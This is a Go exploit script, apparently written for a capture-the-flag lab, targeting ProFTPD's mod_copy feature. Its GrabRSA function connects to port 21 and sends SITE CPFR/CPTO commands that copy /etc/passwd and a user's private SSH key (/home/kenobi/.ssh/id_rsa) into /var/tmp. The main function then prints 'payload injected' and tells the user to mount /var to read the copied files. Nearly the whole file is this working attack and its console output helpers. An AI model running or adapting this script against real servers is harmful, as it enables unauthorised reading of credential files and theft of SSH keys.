package main

import (
	"flag"
	"fmt"
	"net"
	"os"
	"regexp"
)

var ANSI_SET bool = false

var ANSI_CLRLN string = "\r\x1b[2K\r"
var ANSI_CLRSC string = "\x1b[2J\x1b[H"
var ANSI_RST string = "\x1b[0m"
var ANSI_RED string = "\x1b[31;1m"
var ANSI_GRN string = "\x1b[32;1m"
var ANSI_YLW string = "\x1b[33;1m"
var ANSI_BLU string = "\x1b[34;1m"

func SucMsg(msg string) {
	fmt.Printf("%s[%s+%s] %s\n", ANSI_CLRLN, ANSI_GRN, ANSI_RST, msg)
	return
}

func ErrMsg(msg string) {
	fmt.Printf("%s[%s-%s] %s\n", ANSI_CLRLN, ANSI_RED, ANSI_RST, msg)
	return
}

func InfMsg(msg string) {
	fmt.Printf("%s[%si%s] %s\n", ANSI_CLRLN, ANSI_BLU, ANSI_RST, msg)
	return
}

func InfMsgNB(msg string) {
	fmt.Printf("%s[%si%s] %s", ANSI_CLRLN, ANSI_BLU, ANSI_RST, msg)
	return
}

func SysMsg(msg string) {
	fmt.Printf("%s[%s*%s] %s\n", ANSI_CLRLN, ANSI_YLW, ANSI_RST, msg)
	return
}

func SysMsgNB(msg string) {
	fmt.Printf("%s[%s*%s] %s", ANSI_CLRLN, ANSI_YLW, ANSI_RST, msg)
	return
}

func ValidatePort(portno int) (success bool, message string) {
	if (portno < 1) || (portno > 65535) {
		return false, "port must be between 1 and 65535"
	}
	return true, "port valid"
}

//============================================================
//
// Function Name: PrintCenter
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to print a message in the center of a
//  specified number of columns (n).
//
// Input(s):
//
//  msg - string. message to display.
//  n - int. total number of columns in row.
//
// Return(s):
//
//  None
//
//============================================================
func PrintCenter(msg string, n int) {
	var ansi_indent string = "\x1b%s"
	var indent_format string = "[%dC"
	var indent int

	fmt.Printf("%s", ANSI_CLRLN)
	if len(msg) > n {
		fmt.Printf("%s\n", msg)
		return
	}

	indent = (n - len(msg)) / 2
	indent_format = fmt.Sprintf(indent_format, indent)
	ansi_indent = fmt.Sprintf(ansi_indent, indent_format)

	fmt.Printf("%s%s%s%s\n", ansi_indent, ANSI_YLW, msg, ANSI_RST)

	return
}

func PrintChar(char byte, n int) {
	if n < 1 {
		return
	}

	for i := 0; i < n; i++ {
		fmt.Printf("%s%s%s", ANSI_RED, string(char), ANSI_RST)
	}
	fmt.Printf("\n")
}

//============================================================
//
// Function Name: FindMatch
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to take a byte slice, search the slice
//  for a given regular expression pattern, and return the
//  first match of that pattern.
//
// Input(s):
//
//  bodycontent - []byte. byte slice to search for pattern.
//  tgtpattern - string. regex pattern to search for.
//
// Return(s):
//
//  match - string. first match of pattern discovered.
//  success - bool. indication of success.
//  message - string. status message.
//
//============================================================
func FindMatch(bodycontent []byte, tgtpattern string) (match string, success bool, message string) {

	re, err := regexp.Compile(tgtpattern)
	if err != nil {
		return "", false, err.Error()
	}

	matches := re.FindAll(bodycontent, -1)

	if len(matches) < 1 {
		return "", false, "no match found"
	}

	match = string(matches[0])

	return match, true, "match found"
}

func GrabRSA(target string) (err error) {
	var conn net.Conn
	var reader []byte = make([]byte, 1024)

	target = fmt.Sprintf("%s:21", target)

	conn, err = net.Dial("tcp", target)
	if err != nil {
		return err
	}
	defer conn.Close()

	_, err = conn.Read(reader)
	if err != nil {
		return err
	}

	SucMsg("connected to proftpd ...")

	_, err = conn.Write([]byte("site cpfr /etc/passwd\n"))
	if err != nil {
		return err
	}

	_, err = conn.Read(reader)
	if err != nil {
		return err
	}

	_, err = conn.Write([]byte("site cpto /var/tmp/passwd\n"))
	if err != nil {
		return err
	}

	_, err = conn.Read(reader)
	if err != nil {
		return err
	}

	_, err = conn.Write([]byte("site cpfr /home/kenobi/.ssh/id_rsa\n"))
	if err != nil {
		return err
	}

	_, err = conn.Read(reader)
	if err != nil {
		return err
	}

	_, err = conn.Write([]byte("site cpto /var/tmp/id_rsa\n"))
	if err != nil {
		return err
	}

	_, err = conn.Read(reader)
	if err != nil {
		return err
	}

	return nil
}

func init() {
	return
}

func main() {
	var domain string
	var err error

	flag.StringVar(&domain, "d", "127.0.0.1", "domain or ip address of target")
	flag.Parse()

	PrintChar('=', 60)
	PrintCenter("Target Information", 60)
	PrintChar('=', 60)
	InfMsg(fmt.Sprintf("Target Domain: %s", domain))
	PrintChar('=', 60)

	err = GrabRSA(domain)
	if err != nil {
		ErrMsg(err.Error())
		os.Exit(1)
	}
	SucMsg("payload injected")

	InfMsg("mount /var direcotry to view output of commands")

	return
}

